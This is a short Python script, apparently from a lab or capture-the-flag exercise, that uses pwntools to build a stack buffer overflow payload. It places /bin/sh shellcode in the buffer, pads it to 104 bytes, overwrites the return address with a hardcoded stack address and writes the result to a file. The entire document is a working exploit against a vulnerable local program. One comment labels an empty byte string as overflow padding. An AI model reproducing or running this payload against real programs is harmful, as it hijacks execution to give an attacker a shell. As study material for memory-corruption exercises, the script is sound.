#!/usr/bin/env python3
from pwn import *

# Address of buffer (use this in the payload)
buffer_address = 0x7fffffffdd30

# Shellcode for spawning /bin/sh
shellcode = asm(shellcraft.sh())

# Create the payload
payload = b''  # Padding to overflow buffer and reach the return address
payload += shellcode  # Shellcode to spawn /bin/sh
payload += b'A' * (104 - len(payload))  # Padding to make the payload 104 bytes
payload += p64(buffer_address)  # Overwrite the return address with the buffer address

# Open the file in binary mode to write the payload
with open("payload4", "wb") as f:
    f.write(payload)

# Print the payload in hex to check its contents
print(payload.hex())
